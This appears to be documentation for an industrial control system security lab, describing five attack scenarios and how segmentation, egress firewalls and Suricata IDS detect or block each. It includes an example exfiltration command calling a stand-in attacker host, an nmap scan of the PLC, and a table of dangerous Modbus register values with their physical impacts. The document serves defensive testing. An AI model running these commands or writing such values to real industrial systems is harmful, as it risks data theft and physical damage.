# Attack Scenarios & Detection

## Overview

This document describes the attack scenarios tested against the ICS Security Lab and how each was detected or prevented.

## Attack Scenario Matrix

| # | Attack | Vector | Detection/Prevention |
|---|--------|--------|---------------------|
| 1 | Reconnaissance | Port scan from Enterprise | Blocked (no route) |
| 2 | Direct Access | SSH Enterprise → Control | Firewall DENY rule |
| 3 | Pivot Attack | Compromised Historian → PLC | Suricata IDS alert |
| 4 | Malicious Write | Modbus FC6 write command | Suricata IDS alert |
| 5 | Data Exfiltration | Control → Internet | Egress firewall block |

---

## Scenario 1: Network Reconnaissance

### Attack Description
Attacker attempts to scan the Control zone from the Enterprise network to discover OT assets.

### Attack Command
```bash
# From Jump Host (Enterprise Zone)
nmap -Pn -p 502,22,4840 10.2.0.10
```

### Expected Result
- **Status:** BLOCKED
- **Reason:** No VPC peering between Enterprise and Control
- **Evidence:** Connection timeout, no route to host

### Security Control
Network segmentation via VPC isolation

---

## Scenario 2: Direct Unauthorized Access

### Attack Description
Attacker attempts to SSH directly from Enterprise to Control zone.

### Attack Command
```bash
# From Jump Host (Enterprise Zone)
ssh 10.2.0.10
```

### Expected Result
- **Status:** BLOCKED
- **Reason:** No network path exists
- **Evidence:** Connection timeout

### Security Control
VPC peering configuration (no Enterprise ↔ Control peering)

---

## Scenario 3: Pivot Attack via Compromised Historian

### Attack Description
Attacker compromises Historian server and uses it to attack the PLC.

### Attack Command
```bash
# From Historian (Operations Zone)
python3 modbus_attack.py
```

### Expected Result
- **Status:** DETECTED
- **Reason:** Suricata IDS monitoring Modbus traffic
- **Evidence:** Alerts in /var/log/suricata/fast.log

### Sample Alert
```
[**] [1:1000002:1] OT ALERT: Unauthorized Modbus Write Command (FC 06) [**]
{TCP} 10.1.0.10:xxxxx -> 10.2.0.10:502
```

### Security Control
Suricata IDS with custom OT rules

---

## Scenario 4: Malicious Modbus Write

### Attack Description
Attacker sends malicious Modbus write commands to manipulate PLC registers.

### Attack Details
| Register | Normal Value | Attack Value | Impact |
|----------|--------------|--------------|--------|
| 0 (Temp) | 70°F | 500°F | Equipment damage |
| 1 (Pressure) | 100 PSI | 999 PSI | Explosion risk |
| 2 (Flow) | 50 GPM | 0 GPM | Process shutdown |
| 3 (Level) | 80% | 100% | Tank overflow |

### Detection
```
OT ALERT: Unauthorized Modbus Write Command (FC 06)
```

### Security Control
Suricata IDS with Modbus protocol inspection

---

## Scenario 5: Data Exfiltration Attempt

### Attack Description
Attacker attempts to exfiltrate data from Control zone to the internet.

### Attack Command
```bash
# From PLC Simulator (Control Zone)
curl https://attacker-server.com/exfil?data=sensitive
```

### Expected Result
- **Status:** BLOCKED
- **Reason:** Egress firewall denies internet access
- **Evidence:** Connection timeout, firewall logs

### Security Control
Egress firewall rules (air-gap simulation)

---

## Incident Response Procedure

### When Alert is Triggered:

1. **Identify** - Review alert in Suricata logs
2. **Contain** - Isolate affected system if necessary
3. **Investigate** - Analyze traffic patterns, source IP
4. **Remediate** - Block attacker, patch vulnerability
5. **Document** - Record incident for compliance

### Sample Incident Report
```
INCIDENT REPORT
===============
Date: [DATE]
Severity: HIGH
Type: Unauthorized Modbus Write Attempt

Summary:
Detected malicious Modbus write commands targeting PLC at 10.2.0.10.
Attacker attempted to modify temperature setpoint to dangerous level.

Source: 10.1.0.10 (Historian - potentially compromised)
Target: 10.2.0.10:502 (PLC Simulator)

Actions Taken:
1. Alert triggered by Suricata IDS
2. Traffic logged for forensic analysis
3. Historian isolated for investigation

Recommendations:
1. Investigate Historian for compromise
2. Review access controls
3. Implement additional Modbus command validation
```